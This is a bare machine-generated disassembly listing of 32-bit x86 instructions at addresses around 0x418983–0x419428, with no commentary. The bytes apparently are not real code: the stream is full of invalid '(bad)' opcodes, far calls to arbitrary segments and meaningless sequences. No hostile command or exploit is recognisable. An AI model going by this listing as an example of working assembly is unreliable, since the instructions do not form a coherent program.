  418983:	pop    edi
  418984:	xor    esp,ecx
  418986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418987:	shr    BYTE PTR [eax],0xe7
  41898a:	pushf  
  41898b:	inc    ecx
  41898c:	ins    DWORD PTR es:[edi],dx
  41898d:	sub    al,0xac
  41898f:	call   0x914d:0xe887a91d
  418996:	setns  BYTE PTR [esi]
  418999:	inc    ebx
  41899a:	fcmovnu st,st(3)
  41899c:	pop    edi
  41899d:	repnz mul bh
  4189a0:	repnz dec edi
  4189a2:	or     dh,BYTE PTR [ecx+0x9c1b47]
  4189a8:	pop    ss
  4189a9:	nop
  4189aa:	sbb    dh,bh
  4189ac:	xor    esi,ebx
  4189ae:	sbb    DWORD PTR [ebx],ebx
  4189b0:	push   esp
  4189b1:	repz pop edi
  4189b3:	pop    eax
  4189b4:	dec    esp
  4189b5:	mov    ah,0x96
  4189b7:	cmp    BYTE PTR [ebx],0xa7
  4189ba:	push   edi
  4189bb:	xor    eax,0x75d523d8
  4189c0:	icebp  
  4189c1:	icebp  
  4189c2:	jnp    0x4189bf
  4189c4:	ja     0x418957
  4189c6:	dec    edx
  4189c7:	or     al,0xf4
  4189c9:	push   0xffffffb3
  4189cb:	and    edx,0xffffffa8
  4189ce:	test   edi,edi
  4189d0:	add    al,0xd3
  4189d2:	adc    al,BYTE PTR [ebx+ebx*8]
  4189d5:	(bad)  
  4189d6:	mov    dh,0x90
  4189d8:	mov    edi,0x4db980b6
  4189dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189de:	fucomi st,st(1)
  4189e0:	not    DWORD PTR [edx-0x17]
  4189e3:	cmp    dl,al
  4189e5:	lock gs pop esp
  4189e8:	sar    edx,1
  4189ea:	dec    esp
  4189eb:	rcr    BYTE PTR [edi+0x0],0x0
	...
  418a53:	add    BYTE PTR [eax],al
  418a55:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x52e45769
  418a65:	or     DWORD PTR ds:0xff000109,esi
  418a6b:	add    BYTE PTR [eax],al
  418a6d:	add    BYTE PTR [edi+0x1adc6b41],al
  418a73:	js     0x418a44
  418a75:	sar    dl,1
  418a77:	daa    
  418a78:	mov    ebp,0x2bea1b7b
  418a7d:	cmp    DWORD PTR [esi+0x13],edi
  418a80:	retf   
  418a81:	xlat   BYTE PTR ds:[ebx]
  418a82:	ds cmp eax,0xd530238e
  418a88:	inc    ecx
  418a89:	pop    ecx
  418a8a:	dec    ebp
  418a8b:	pusha  
  418a8c:	or     eax,0x29b44226
  418a91:	jg     0x418a63
  418a93:	mov    BYTE PTR [edi+0x69baf205],0x3c
  418a9a:	sbb    BYTE PTR [edi],dl
  418a9c:	(bad)  
  418a9d:	rcr    BYTE PTR [ecx-0x1f],1
  418aa0:	pusha  
  418aa1:	fsubr  DWORD PTR [esi]
  418aa3:	std    
  418aa4:	pushf  
  418aa5:	adc    ah,BYTE PTR [ebx-0x1e694fc7]
  418aab:	inc    ebp
  418aac:	dec    esi
  418aad:	inc    edi
  418aae:	les    edi,FWORD PTR ss:[eax]
  418ab1:	mov    cl,0x2e
  418ab3:	pop    ds
  418ab4:	aaa    
  418ab5:	inc    esi
  418ab6:	xor    bh,bh
  418ab8:	imul   edx,edi,0x21512f49
  418abe:	icebp  
  418abf:	mov    edx,0x7f14caff
  418ac4:	adc    ch,BYTE PTR [esi]
  418ac6:	mov    WORD PTR [esi-0x5375f512],?
  418acc:	sub    al,0xc3
  418ace:	mov    ebp,ss
  418ad0:	sti    
  418ad1:	jmp    FWORD PTR [ecx]
  418ad3:	scas   eax,DWORD PTR es:[edi]
  418ad4:	(bad)  
  418ad5:	jb     0x418ac4
  418ad7:	ja     0x418b12
  418ad9:	clc    
  418ada:	mov    ebx,0x3d8458ff
  418adf:	jns    0x418a9f
  418ae1:	outs   dx,DWORD PTR ds:[esi]
  418ae2:	loopne 0x418aa7
  418ae4:	sbb    al,0x69
  418ae6:	icebp  
  418ae7:	mov    ebx,0xba37bfa3
  418aec:	fcomp  QWORD PTR [eax]
  418aee:	xor    dl,bh
  418af0:	fs mul DWORD PTR es:[ebx+0x5d74122b]
  418af8:	rcr    DWORD PTR [ecx-0x1b1260e2],0x55
  418aff:	fdivr  DWORD PTR [edx+0x5f689273]
  418b05:	daa    
  418b06:	les    edx,FWORD PTR [esi]
  418b08:	inc    ebx
  418b09:	bound  ecx,QWORD PTR [esi-0x7304964e]
  418b0f:	ret    
  418b10:	in     eax,0x10
  418b12:	not    DWORD PTR [ecx+ebx*8+0x687dd8e9]
  418b19:	cmp    ebp,DWORD PTR [edx+0x14]
  418b1c:	mov    eax,ds:0x81b83ccc
  418b21:	dec    edi
  418b22:	and    dl,BYTE PTR [eax+0x2b7ab1f9]
  418b28:	xor    bh,bh
  418b2a:	iret   
  418b2b:	cmp    BYTE PTR [eax+0x69],bl
  418b2e:	dec    esp
  418b2f:	stos   DWORD PTR es:[edi],eax
  418b30:	mov    al,ds:0x1ba8646
  418b35:	jge    0x418b10
  418b37:	or     al,0x86
  418b39:	pop    edx
  418b3a:	call   0xd90c:0xead5d918
  418b41:	cmp    DWORD PTR [edi],0xffffffb4
  418b44:	std    
  418b45:	mul    DWORD PTR [esi-0x1c152d72]
  418b4b:	fwait
  418b4c:	pusha  
  418b4d:	mov    dl,0xeb
  418b4f:	add    DWORD PTR [ebx+ebx*2+0x4e],edi
  418b53:	xchg   edx,eax
  418b54:	mov    al,ds:0x4df79ef6
  418b59:	inc    esi
  418b5a:	xor    BYTE PTR [eax],ch
  418b5c:	cmp    ebp,DWORD PTR [edx]
  418b5e:	call   0x6586:0xd18e7dc0
  418b65:	call   0xd067:0xdd4a24f6
  418b6c:	daa    
	...
  418bd5:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418bd9:	xor    ch,bh
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0xe3
  418be3:	inc    ebx
  418be4:	cmp    esp,DWORD PTR [esi+0x34]
  418be7:	or     al,BYTE PTR [ecx]
  418be9:	add    bh,bh
  418beb:	add    BYTE PTR [eax],al
  418bed:	add    BYTE PTR [edi+0x73749b77],al
  418bf3:	retf   
  418bf4:	cld    
  418bf5:	mov    eax,0x35f49676
  418bfa:	and    BYTE PTR [ecx+0x64],cl
  418bfd:	push   edx
  418bfe:	test   al,0x85
  418c00:	test   eax,0xb17af279
  418c05:	add    DWORD PTR [ebx-0x5d],0x4c792601
  418c0c:	std    
  418c0d:	xor    eax,0x1c3fac00
  418c12:	ret    
  418c13:	retf   
  418c14:	xlat   BYTE PTR ds:[ebx]
  418c15:	scas   eax,DWORD PTR es:[edi]
  418c16:	retf   
  418c17:	sbb    esp,edi
  418c19:	fidiv  WORD PTR [edi+0x2f25bade]
  418c1f:	jle    0x418c4f
  418c21:	lock paddusw mm0,QWORD PTR [ecx]
  418c25:	xor    al,0xba
  418c27:	cmp    DWORD PTR [ecx],0x2dcde131
  418c2d:	inc    ebp
  418c2e:	mov    al,0xf0
  418c30:	xor    al,BYTE PTR [ebp+0x70]
  418c33:	xchg   ebx,eax
  418c34:	sbb    eax,0xcf2175dd
  418c39:	(bad)  
  418c3a:	xor    bl,al
  418c3c:	inc    ebx
  418c3d:	mov    ds:0x4809a2b0,al
  418c42:	in     al,dx
  418c43:	xchg   esi,eax
  418c44:	ins    BYTE PTR es:[edi],dx
  418c45:	ds xchg ebx,eax
  418c47:	inc    edx
  418c48:	xor    dh,ch
  418c4a:	xchg   DWORD PTR [ebx],ebp
  418c4c:	es dec esp
  418c4e:	pop    ecx
  418c4f:	or     al,0x8
  418c51:	push   ss
  418c52:	pop    ss
  418c53:	inc    eax
  418c54:	jl     0x418be9
  418c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c57:	les    ebx,FWORD PTR [esi-0x45]
  418c5a:	jp     0x418c8e
  418c5c:	and    eax,0x1b8340c9
  418c61:	cld    
  418c62:	fmul   QWORD PTR [ecx]
  418c64:	aaa    
  418c65:	fwait
  418c66:	add    edi,DWORD PTR [ebp+eiz*2+0xe]
  418c6a:	popa   
  418c6b:	std    
  418c6c:	pop    edi
  418c6d:	and    DWORD PTR [edx],eax
  418c6f:	or     al,0xd2
  418c71:	and    dl,al
  418c73:	xor    al,0xb2
  418c75:	in     eax,dx
  418c76:	mov    ecx,0xd31305c3
  418c7b:	(bad)  
  418c7c:	pusha  
  418c7d:	mov    ds:0x4837700d,eax
  418c82:	jl     0x418c15
  418c84:	inc    edx
  418c85:	inc    eax
  418c86:	inc    edi
  418c87:	retf   0x99ab
  418c8a:	lea    ebx,[edx+0x7d7df212]
  418c90:	add    edx,DWORD PTR [ecx+0x6c]
  418c93:	pushf  
  418c94:	sar    BYTE PTR [ebp+0x19ea7b47],1
  418c9a:	mov    al,0xb1
  418c9c:	addr16 pop esp
  418c9e:	retf   0xfa66
  418ca1:	outs   dx,DWORD PTR ds:[esi]
  418ca2:	xor    eax,0x2715a7ac
  418ca7:	adc    dl,BYTE PTR [ecx]
  418ca9:	cmp    eax,ebx
  418cab:	cmp    DWORD PTR [edi],ecx
  418cad:	cld    
  418cae:	dec    esp
  418caf:	stos   DWORD PTR es:[edi],eax
  418cb0:	imul   edx,DWORD PTR [eax],0x47
  418cb3:	mov    dl,0x83
  418cb5:	(bad)  
  418cb6:	iret   
  418cb7:	jp     0x418cb1
  418cb9:	or     ch,BYTE PTR [edx+edi*8]
  418cbc:	add    ecx,0x5c
  418cbf:	movq   mm3,QWORD PTR [ecx-0x521e10dd]
  418cc6:	call   0x1cb9ecc3
  418ccb:	cmp    esi,DWORD PTR [ebx+0x160b3b2f]
  418cd1:	push   ebx
  418cd2:	inc    edi
  418cd3:	shr    DWORD PTR [edx+0x2af98fba],1
  418cd9:	mov    esi,0xedcda9fd
  418cde:	mov    esi,0x9fde76fd
  418ce3:	call   0xfd7b:0x176b5249
  418cea:	and    eax,0x2a96
	...
  418d53:	add    BYTE PTR [eax],al
  418d55:	add    bl,bh
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	rol    BYTE PTR [esi-0x7f],cl
  418d64:	frstor [edx+0x33]
  418d67:	or     eax,DWORD PTR [ecx]
  418d69:	add    bh,bh
  418d6b:	add    BYTE PTR [eax],al
  418d6d:	add    al,cl
  418d6f:	add    ah,al
  418d71:	push   esp
  418d72:	xchg   esi,eax
  418d73:	add    eax,0xe3f773ef
  418d78:	jge    0x418dc9
  418d7a:	aad    0xdf
  418d7c:	call   0xe8a2:0x87122c90
  418d83:	inc    edi
  418d84:	call   0x6095:0xcb3d57c6
  418d8b:	pop    esp
  418d8c:	push   eax
  418d8d:	push   0xbff08331
  418d92:	pushf  
  418d93:	test   DWORD PTR [esi+0x7],eax
  418d96:	ins    BYTE PTR es:[edi],dx
  418d97:	pushf  
  418d98:	push   esi
  418d99:	in     eax,dx
  418d9a:	dec    ecx
  418d9b:	pusha  
  418d9c:	int    0x3
  418d9e:	shl    DWORD PTR [edi-0x261c7610],0x0
  418da5:	and    al,0x2a
  418da7:	int3   
  418da8:	out    dx,al
  418da9:	pop    edx
  418daa:	into   
  418dab:	dec    ebx
  418dac:	inc    eax
  418dad:	pop    ss
  418dae:	scas   eax,DWORD PTR es:[edi]
  418daf:	lods   eax,DWORD PTR ds:[esi]
  418db0:	jecxz  0x418d98
  418db2:	cmp    BYTE PTR ds:0x3849a5f4,dh
  418db8:	imul   eax,DWORD PTR [eax],0xffffffa0
  418dbb:	push   esp
  418dbc:	or     DWORD PTR [ebx+ebx*2-0x6c8d7525],ebx
  418dc3:	and    BYTE PTR [ebp-0x6b3ae46f],dl
  418dc9:	and    eax,0xc03bc8b9
  418dce:	mov    DWORD PTR [esi+0x4dd9343e],ebx
  418dd4:	sbb    cl,BYTE PTR [esi]
  418dd6:	cmp    al,0x3
  418dd8:	fist   WORD PTR [ebx+0xaafc1ee]
  418dde:	and    al,al
  418de0:	clc    
  418de1:	jmp    0x418e4b
  418de3:	int    0xe3
  418de5:	pop    ss
  418de6:	sahf   
  418de7:	or     BYTE PTR [esi+0x1a33ab18],0xdc
  418dee:	pushw  cs
  418df0:	ins    DWORD PTR es:[edi],dx
  418df1:	mov    ebp,0x32a8bb98
  418df6:	ss ret 0x8767
  418dfa:	mov    ah,0x77
  418dfc:	sbb    DWORD PTR [edi-0x2c],edi
  418dff:	inc    esi
  418e00:	aam    0x76
  418e02:	dec    edi
  418e03:	es xchg esp,eax
  418e05:	fbstp  TBYTE PTR [edi-0x36f5bd9d]
  418e0b:	mov    ch,0x92
  418e0d:	adc    esp,DWORD PTR [ecx+0x59]
  418e10:	(bad)  
  418e11:	sbb    eax,0xeed6391e
  418e16:	shr    BYTE PTR [esi-0xdea7088],0xfd
  418e1d:	inc    DWORD PTR [esi+0x28]
  418e20:	xchg   ecx,eax
  418e21:	xor    BYTE PTR [ecx],dh
  418e23:	(bad)  
  418e24:	sbb    dh,BYTE PTR [edi+0x18]
  418e27:	test   eax,0x37894a7d
  418e2c:	sub    eax,DWORD PTR [ecx]
  418e2e:	stos   BYTE PTR es:[edi],al
  418e2f:	outs   dx,DWORD PTR ds:[esi]
  418e30:	aad    0x6a
  418e32:	sbb    al,0xe1
  418e34:	imul   edx,DWORD PTR [eax+eax*8],0xddaa6bf2
  418e3b:	fld    TBYTE PTR [edx]
  418e3d:	and    eax,0x6ef9adaa
  418e42:	sbb    ecx,DWORD PTR [ecx+ebp*1-0x3334dab4]
  418e49:	and    DWORD PTR [edx+eax*1],0x9
  418e4d:	imul   ecx,DWORD PTR [eax],0xffffffbd
  418e50:	inc    ecx
  418e51:	ja     0x418ec0
  418e53:	and    eax,0xbcdbe1aa
  418e58:	xchg   ebx,eax
  418e59:	adc    eax,0xd0b9fd83
  418e5e:	(bad)  
  418e5f:	xor    ebx,0xf837d4d8
  418e65:	daa    
  418e66:	fisttp WORD PTR [edi*1-0x624fc177]
	...
  418ed5:	add    BYTE PTR [esi],cl
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx-0x28]
  418ee3:	xchg   edx,eax
  418ee4:	int3   
  418ee5:	mov    esi,DWORD PTR [edx]
  418ee7:	or     al,0x1
  418ee9:	add    bh,bh
  418eeb:	add    BYTE PTR [eax],al
  418eed:	add    BYTE PTR [edx],ah
  418eef:	cmp    al,0x3f
  418ef1:	jne    0x418f3c
  418ef3:	dec    edx
  418ef4:	(bad)  
  418ef5:	push   ds
  418ef6:	xor    bl,BYTE PTR [esi]
  418ef8:	(bad)  [edx-0x2e]
  418efb:	sub    eax,0x67195bbe
  418f00:	loope  0x418e99
  418f02:	int    0xc3
  418f04:	(bad)  
  418f05:	std    
  418f06:	mov    bh,0x41
  418f08:	add    ecx,ebp
  418f0a:	shl    DWORD PTR [edx-0x5f],0xe6
  418f0e:	and    ebx,ebx
  418f10:	dec    ecx
  418f11:	pusha  
  418f12:	clc    
  418f13:	stos   DWORD PTR es:[edi],eax
  418f14:	cmp    edi,edi
  418f16:	mov    bh,0x40
  418f18:	mov    ds:0x7fe5a51,eax
  418f1d:	add    DWORD PTR [esi+0x1b19ceff],0x40
  418f24:	mov    esp,0xb120a504
  418f29:	leave  
  418f2a:	push   ecx
  418f2b:	sbb    ebx,DWORD PTR ds:0xd2e25e34
  418f31:	sahf   
  418f32:	je     0x418f7f
  418f34:	movzx  ebx,ch
  418f37:	outs   dx,DWORD PTR ds:[esi]
  418f38:	aaa    
  418f39:	xchg   DWORD PTR [ebp+0x5894fa96],ebp
  418f3f:	jl     0x418f3e
  418f41:	jo     0x418f8e
  418f43:	sti    
  418f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f45:	pop    ebx
  418f46:	jbe    0x418f37
  418f48:	nop
  418f49:	cs call 0x4102:0xd45a553d
  418f51:	inc    edi
  418f52:	cmp    ch,al
  418f54:	aas    
  418f55:	sbb    esp,DWORD PTR [esi+ebp*4]
  418f58:	pop    edx
  418f59:	sar    BYTE PTR [eax-0x5f],cl
  418f5c:	push   cs
  418f5d:	cld    
  418f5e:	jmp    FWORD PTR [edx+0x66]
  418f61:	mov    al,0xbb
  418f63:	mov    dl,BYTE PTR [ecx-0x5b13cc5c]
  418f69:	jo     0x418f17
  418f6b:	retf   0x3219
  418f6e:	cmp    DWORD PTR [edx+0x11],ebp
  418f71:	cli    
  418f72:	popa   
  418f73:	das    
  418f74:	mov    gs,WORD PTR [edi-0x7a]
  418f77:	ret    
  418f78:	mov    ah,0xe1
  418f7a:	and    DWORD PTR [edx+eax*4],eax
  418f7d:	add    eax,0xbe1d3d76
  418f82:	sbb    eax,0xfc49ae1f
  418f87:	mov    edi,ds
  418f89:	sub    ebp,eax
  418f8b:	in     eax,dx
  418f8c:	jmp    0x41900d
  418f8e:	add    al,0x41
  418f90:	adc    dl,dl
  418f92:	fsub   DWORD PTR [esi]
  418f94:	nop
  418f95:	int3   
  418f96:	pop    ebp
  418f97:	pop    es
  418f98:	push   esp
  418f99:	scas   al,BYTE PTR es:[edi]
  418f9a:	stos   BYTE PTR es:[edi],al
  418f9b:	loopne 0x418f5c
  418f9d:	or     ch,BYTE PTR [ebp+0x167a6fc7]
  418fa3:	xchg   DWORD PTR [eax+0x76890769],edi
  418fa9:	stc    
  418faa:	loopne 0x419004
  418fac:	cmp    al,0x84
  418fae:	jb     0x418fb1
  418fb0:	jg     0x419012
  418fb2:	bound  ecx,QWORD PTR [esi]
  418fb4:	enter  0x87f4,0x1b
  418fb8:	sar    DWORD PTR [edi],cl
  418fba:	repz or cl,BYTE PTR [esi-0x149a867]
  418fc1:	adc    BYTE PTR [ebx],dl
  418fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fc4:	sub    cl,dl
  418fc6:	aam    0x9c
  418fc8:	xchg   esp,eax
  418fc9:	cmp    edi,DWORD PTR ss:[edi]
  418fcc:	jmp    0x418f56
  418fce:	xchg   edx,eax
  418fcf:	retf   
  418fd0:	sub    ecx,edx
  418fd2:	mov    esi,0xea073947
  418fd7:	fcmovb st,st(1)
  418fd9:	mov    ecx,0x264680ec
  418fde:	sti    
  418fdf:	dec    ebp
  418fe0:	pop    ds
  418fe1:	pusha  
  418fe2:	inc    ebx
  418fe3:	ret    
  418fe4:	jecxz  0x418f91
  418fe6:	ss leave 
  418fe8:	mov    ebp,0x78ad5b59
	...
  419055:	add    BYTE PTR [edi+edx*4],bl
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx-0x31150e59]
  419063:	loope  0x419089
  419065:	pop    ecx
  419066:	xor    DWORD PTR ds:0xff0001,ecx
  41906c:	add    BYTE PTR [eax],al
  41906e:	dec    eax
  41906f:	(bad)  
  419070:	out    0x61,al
  419072:	inc    edi
  419073:	or     bl,cl
  419075:	mov    esi,ebx
  419077:	jle    0x419034
  419079:	jns    0x419028
  41907b:	xchg   BYTE PTR ds:0x92de1c5c,bh
  419081:	rcl    ebp,1
  419083:	push   ebx
  419084:	xlat   BYTE PTR ds:[ebx]
  419085:	out    dx,eax
  419086:	xor    BYTE PTR [eax-0x387263fa],bh
  41908c:	mov    ebp,0x732271e7
  419091:	cdq    
  419092:	and    BYTE PTR [ebx],al
  419094:	repz cld 
  419096:	ins    DWORD PTR es:[edi],dx
  419097:	inc    ebx
  419098:	clc    
  419099:	out    dx,eax
  41909a:	push   edi
  41909b:	bound  edx,QWORD PTR [ebx+0x25c380b4]
  4190a1:	fbstp  TBYTE PTR [edx]
  4190a3:	add    DWORD PTR [esi+0x3fe56d8b],eax
  4190a9:	scas   eax,DWORD PTR es:[edi]
  4190aa:	mov    BYTE PTR [edi-0x3dbf07a0],al
  4190b0:	lods   eax,DWORD PTR ds:[esi]
  4190b1:	js     0x419118
  4190b3:	mov    edx,0x24630b97
  4190b8:	jbe    0x4190af
  4190ba:	hlt    
  4190bb:	dec    esp
  4190bc:	ret    0x2fdb
  4190bf:	xor    eax,0x692e529f
  4190c4:	push   0xf4cd4d6a
  4190c9:	aas    
  4190ca:	sahf   
  4190cb:	(bad)  
  4190cc:	cmp    DWORD PTR [ebx-0x6],esp
  4190cf:	inc    ebp
  4190d0:	stc    
  4190d1:	dec    eax
  4190d2:	push   ds
  4190d3:	sbb    DWORD PTR [eax+0x7101d90f],0x2ab1e811
  4190dd:	push   ss
  4190de:	mov    WORD PTR [ebp-0xba0f7d0],es
  4190e4:	out    0x7f,eax
  4190e6:	push   ebx
  4190e7:	mov    ebx,0xa1ffcd5e
  4190ec:	ror    edx,0x22
  4190ef:	push   ebp
  4190f0:	sub    edx,ebx
  4190f2:	(bad)  
  4190f3:	push   ds
  4190f4:	scas   eax,DWORD PTR es:[edi]
  4190f5:	sti    
  4190f6:	ffreep st(0)
  4190f8:	out    0x74,al
  4190fa:	outs   dx,DWORD PTR ds:[esi]
  4190fb:	call   0x57d1b20
  419100:	and    BYTE PTR [ecx],0x48
  419103:	ins    DWORD PTR es:[edi],dx
  419104:	xor    eax,0x20aad8f1
  419109:	fnstenv [ebp-0x30964c33]
  41910f:	shr    edi,cl
  419111:	out    0x83,al
  419113:	shl    BYTE PTR [eax+0x59],cl
  419116:	out    dx,eax
  419117:	sbb    al,0xbb
  419119:	sub    esi,ebp
  41911b:	out    0x9c,eax
  41911d:	rcr    BYTE PTR [ecx-0x460390b4],1
  419123:	mov    ebp,0x68736e30
  419128:	adc    BYTE PTR [eax-0x6],0xe5
  41912c:	cmp    esi,DWORD PTR [esi-0xf5e8b5e]
  419132:	fisttp DWORD PTR [ecx]
  419134:	setge  cl
  419137:	shr    edx,cl
  419139:	cs mov esp,0xc7d8a524
  41913f:	xor    BYTE PTR [eax-0x4d],dh
  419142:	xchg   ebx,eax
  419143:	pop    DWORD PTR [ecx+0x2d5c90fd]
  419149:	xchg   esi,eax
  41914a:	sahf   
  41914b:	push   ss
  41914c:	pusha  
  41914d:	aad    0x9f
  41914f:	mov    ds:0x169dfbdf,al
  419154:	ret    
  419155:	gs jns 0x4190f9
  419158:	add    eax,0x24c9691e
  41915d:	xchg   esp,eax
  41915e:	(bad)  
  41915f:	imul   esp,ecx,0xc5d9d9d9
  419165:	push   es
  419166:	(bad)  
  419168:	rcl    DWORD PTR cs:[eax+0xe83e],cl
	...
  4191d3:	add    BYTE PTR [eax],al
  4191d5:	add    BYTE PTR [edi-0x41bd617b],ch
  4191db:	pop    ebx
  4191dc:	(bad)  
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     dl,dh
  4191e3:	push   eax
  4191e4:	das    
  4191e5:	xchg   esp,eax
  4191e6:	xor    BYTE PTR [esi],cl
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	inc    DWORD PTR [eax]
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	pushf  
  4191ef:	gs jmp 0x45941299
  4191f5:	mov    dh,0x7b
  4191f7:	ins    BYTE PTR es:[edi],dx
  4191f8:	pop    ss
  4191f9:	jge    0x41919b
  4191fb:	and    al,0xcc
  4191fd:	fist   WORD PTR [edx+0x494f0ed1]
  419203:	pop    eax
  419204:	jmp    0x6b847634
  419209:	shr    DWORD PTR [edx],0xeb
  41920c:	jmp    0x8c92:0xbb2bf6ad
  419213:	adc    BYTE PTR [eax+0x37],bl
  419216:	cmc    
  419217:	sub    eax,0x60915160
  41921c:	mov    es,edx
  41921e:	mov    ebp,0x1d0e92f4
  419223:	pop    ebx
  419224:	int    0xc7
  419226:	sar    BYTE PTR [eax+0x2e],0x1f
  41922a:	neg    al
  41922c:	inc    ecx
  41922d:	ss jmpw 0x740
  419232:	pusha  
  419233:	int3   
  419234:	hlt    
  419235:	int3   
  419236:	push   edi
  419237:	test   DWORD PTR [esi+0x7a4ace2a],edi
  41923d:	jmp    0x419296
  41923f:	and    esp,DWORD PTR [ebx]
  419241:	pushf  
  419242:	mov    bl,0x32
  419244:	std    
  419245:	mov    bh,0x6f
  419247:	cld    
  419248:	and    ebp,DWORD PTR [esi]
  41924a:	sub    eax,0xe1429b16
  41924f:	mov    ds:0xfe1cf341,eax
  419254:	sahf   
  419255:	fs (bad) 
  419257:	dec    ecx
  419258:	ret    0xf38d
  41925b:	fcomp  DWORD PTR [ebx+0x1e03337f]
  419261:	inc    eax
  419262:	dec    eax
  419263:	loop   0x419238
  419265:	int    0xac
  419267:	mov    eax,0x4313f9aa
  41926c:	mov    edi,DWORD PTR [ebx+0x6224e34]
  419272:	mov    dh,0x1
  419274:	jmp    0x207cfc2a
  419279:	mov    cl,0x41
  41927b:	inc    ecx
  41927c:	or     esp,DWORD PTR [ecx]
  41927e:	jecxz  0x419238
  419280:	call   0xfa8dc58f
  419285:	dec    eax
  419286:	cmp    edi,DWORD PTR [ecx]
  419288:	sub    DWORD PTR [eax],0xa4a89949
  41928e:	(bad)  
  41928f:	popf   
  419290:	jnp    0x4192c0
  419292:	jle    0x41925b
  419294:	xor    eax,DWORD PTR [eax+0x3a]
  419297:	mov    BYTE PTR [edx],al
  419299:	cli    
  41929a:	call   0x9282:0xc5adcde3
  4192a1:	dec    edx
  4192a2:	sbb    al,0xc1
  4192a4:	jmp    0x20a45fa1
  4192a9:	and    ah,BYTE PTR [ecx+0x46eaa82a]
  4192af:	mov    ds:0x657b0e25,eax
  4192b4:	loop   0x4192e2
  4192b6:	mov    ah,0xad
  4192b8:	loop   0x4192b0
  4192ba:	xchg   ecx,eax
  4192bb:	stos   DWORD PTR es:[edi],eax
  4192bc:	inc    esp
  4192bd:	jg     0x419308
  4192bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192c0:	loopne 0x419314
  4192c2:	mov    al,ds:0x5621ff4c
  4192c7:	pop    esi
  4192c8:	mov    eax,ds:0x96280b30
  4192cd:	mov    ebx,0xe7c529f7
  4192d2:	test   DWORD PTR [ebx+eax*2+0x6ed13bb7],esi
  4192d9:	shr    DWORD PTR [edx-0x7bc6d842],1
  4192df:	mov    ss:0x3b2a50eb,eax
  4192e5:	outs   dx,DWORD PTR ds:[esi]
  4192e6:	iret   
  4192e7:	sub    al,0x35
  4192e9:	in     eax,dx
  4192ea:	jmp    0x0:0x28f5
	...
  419355:	add    BYTE PTR [eax-0xcc4519],ah
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	xchg   edx,eax
  419363:	xor    DWORD PTR [edx*8+0x10f2f],ecx
  41936a:	inc    DWORD PTR [eax]
  41936c:	add    BYTE PTR [eax],al
  41936e:	inc    edx
  41936f:	test   cl,ah
  419371:	cs out 0xa5,eax
  419374:	mov    bl,0x67
  419376:	inc    eax
  419377:	fild   DWORD PTR [esi]
  419379:	aad    0x17
  41937b:	sbb    DWORD PTR [eax],esp
  41937d:	stos   DWORD PTR es:[edi],eax
  41937e:	or     BYTE PTR [eax+0x5ce77565],bl
  419384:	push   esi
  419385:	xchg   ebp,eax
  419386:	es test al,0x4c
  419389:	popf   
  41938a:	popa   
  41938b:	gs xor eax,0xe265556f
  419391:	shl    eax,0xeb
  419394:	jo     0x419414
  419396:	sbb    eax,0xdc894159
  41939b:	rcl    DWORD PTR [esi-0x67],0xaf
  41939f:	dec    ebx
  4193a0:	sub    DWORD PTR [ebp+0x57b13d64],edx
  4193a6:	iret   
  4193a7:	adc    ch,BYTE PTR [edx-0x5a345813]
  4193ad:	dec    ebx
  4193ae:	fst    QWORD PTR [ebp+0x56]
  4193b1:	arpl   WORD PTR [ebx+0x40],cx
  4193b4:	cmp    DWORD PTR [esi+0x6b],esi
  4193b7:	inc    ebx
  4193b8:	ret    0xd1a1
  4193bb:	in     eax,dx
  4193bc:	mov    cl,0xf5
  4193be:	sbb    bl,BYTE PTR [edi-0x6e]
  4193c1:	sbb    eax,0x28af746f
  4193c6:	cs xor eax,0xb44f05a7
  4193cc:	in     al,dx
  4193cd:	xchg   esi,eax
  4193ce:	xchg   esi,eax
  4193cf:	mov    ah,0xb3
  4193d1:	ins    DWORD PTR es:[edi],dx
  4193d2:	lahf   
  4193d3:	inc    esi
  4193d4:	jge    0x41939f
  4193d6:	mov    cl,0x8f
  4193d8:	push   0xffffffb4
  4193da:	and    DWORD PTR [eax+0x5f],ebx
  4193dd:	cmp    bh,ah
  4193df:	rcl    al,1
  4193e1:	xor    ah,cl
  4193e3:	inc    ecx
  4193e4:	push   ecx
  4193e5:	rol    DWORD PTR [ebp+0x1],1
  4193e8:	mov    ebx,DWORD PTR [eax+0x7d]
  4193eb:	cwde   
  4193ec:	fmul   DWORD PTR [edx-0x717801ca]
  4193f2:	sub    BYTE PTR [ebx],bh
  4193f4:	outs   dx,DWORD PTR ds:[esi]
  4193f5:	jmp    0xe5b:0x51dcab12
  4193fc:	ds cmp ebx,esp
  4193ff:	scas   al,BYTE PTR es:[edi]
  419400:	lods   eax,DWORD PTR ds:[esi]
  419401:	cmc    
  419402:	mov    ebp,0x8789f628
  419407:	test   al,0x98
  419409:	call   0x3935:0x7f4aefa8
  419410:	cmp    bh,BYTE PTR [ecx+0x459e76fa]
  419416:	add    dl,BYTE PTR [ebx-0x592987b8]
  41941c:	push   cs
  41941d:	repnz pushf 
  41941f:	or     eax,0x225ec8b
  419424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419425:	and    al,0xf7
  419427:	outs   dx,BYTE PTR ds:[esi]
  419428:	scas   al,BYTE PTR es:[edi]
